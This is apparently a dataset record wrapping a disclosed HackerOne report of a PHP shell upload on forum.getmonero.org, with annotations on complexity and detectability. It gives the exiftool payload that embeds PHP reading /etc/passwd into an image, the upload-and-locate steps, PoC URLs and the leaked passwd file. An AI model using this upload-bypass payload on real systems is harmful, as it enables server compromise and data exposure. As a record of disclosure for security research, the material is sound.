@@ -1,0 +1,45 @@
+{
+  "reported_to": "Monero",
+  "reported_by": "kaulse ",
+  "title": "forum.getmonero.org Shell upload",
+  "content": "\nSummary:\nThe method uploadProfile in the UsersController allows an attacker to upload a shell to the target server due to lack of image validation.\nDescription:\nSteps To Reproduce:\nOpen POC https://forum.getmonero.org/uploads/profile/lNobodyl1527340454.php or https://forum.getmonero.org/uploads/profile/lNobodyl1527341021.php Or just follow these steps:\nFind a nice picture and embed the shell into the image like this exiftool -documentname='<?php echo file_get_contents(\"/etc/passwd\"); ?>' picture.png\nRename the jpg/png picture to the .php extension.\nUpload the picture.\nYou will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp.\nUse the timestamp to find your shell: https://forum.getmonero.org/uploads/profile/[USERNAMAE][timestamp].php\nGathered infos:\nCode 2.10 KiB\n1root:x:0:0:root:/root:/bin/bash\n2daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n3bin:x:2:2:bin:/bin:/usr/sbin/nologin\n4sys:x:3:3:sys:/dev:/usr/sbin/nologin\n5sync:x:4:65534:sync:/bin:/bin/sync\n6games:x:5:60:games:/usr/games:/usr/sbin/nologin\n7man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n8lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n9mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n10news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n11uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n12proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n13www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n14backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n15list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n16irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n17gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n18nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n19syslog:x:101:104::/home/syslog:/bin/false\n20messagebus:x:102:105::/var/run/dbus:/bin/false\n21bind:x:103:109::/var/cache/bind:/bin/false\n22ntpd:x:104:110::/var/run/openntpd:/bin/false\n23sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin\n24fluffypony:x:1000:1000:Fluffypony,,,:/home/fluffypony:/bin/bash\n25postfix:x:106:114::/var/spool/postfix:/bin/false\n26ossec:x:1001:1001::/var/lib/dome9/ossec:/bin/false\n27mysql:x:107:116:MySQL Server,,,:/var/lib/mysql:/bin/false\n28redis:x:108:118:redis server,,,:/var/lib/redis:/bin/false\n29pollinate:x:109:1::/var/cache/pollinate:/bin/false\n30gearman:x:110:119:Gearman Job Server,,,:/var/lib/gearman:/bin/false\n31memcache:x:111:120:Memcached,,,:/nonexistent:/bin/false\n32debian-tor:x:112:121::/var/lib/tor:/bin/false\n33systemd-timesync:x:113:123:systemd Time Synchronization,,,:/run/systemd:/bin/false\n34systemd-network:x:114:124:systemd Network Management,,,:/run/systemd/netif:/bin/false\n35systemd-resolve:x:115:125:systemd Resolver,,,:/run/systemd/resolve:/bin/false\n36systemd-bus-proxy:x:116:126:systemd Bus Proxy,,,:/run/systemd:/bin/false\n37uuidd:x:100:101::/run/uuidd:/bin/false\n38_apt:x:117:65534::/nonexistent:/bin/false\n39blackfire:x:999:999::/dev/null:\n40colord:x:118:129:colord colour management daemon,,,:/var/lib/colord:/bin/false\n41oident:x:119:130::/:/bin/false\nImpact\nA hacker can hack the server ^^.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1532706840,
+  "report_url": "https://hackerone.com/reports/357858",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Embed a shell into an image using exiftool: exiftool -documentname='<?php echo file_get_contents(\"/etc/passwd\"); ?>' picture.png"
+    ],
+    [
+      2,
+      "Rename the image to .php extension and upload it to the forum.getmonero.org profile picture upload feature"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to upload a malicious PHP shell disguised as an image file to the server due to insufficient file type validation in the profile picture upload feature. This leads to remote code execution by accessing the uploaded PHP file.",
+  "reason": "The attack involves a simple file upload bypass technique that is well-documented and commonly exploited. The only non-trivial step is extracting the timestamp from the error response to locate the uploaded file, but this is a straightforward process.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves uploading a shell via image upload functionality, which is an action that can be captured in the normal flow of user interactions. The methodology involves swapping user sessions and testing actions with different resource IDs, which would include testing the upload functionality with different file types and names. The lack of image validation is a server-side issue that would be detected when the action (upload) is tested with a malicious file (resource_id).",
+    "is_detectable": true
+  }
+}
